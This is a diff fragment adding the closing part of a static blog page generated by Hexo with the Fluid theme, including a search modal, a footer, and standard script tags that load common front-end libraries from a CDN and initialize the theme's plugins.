+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
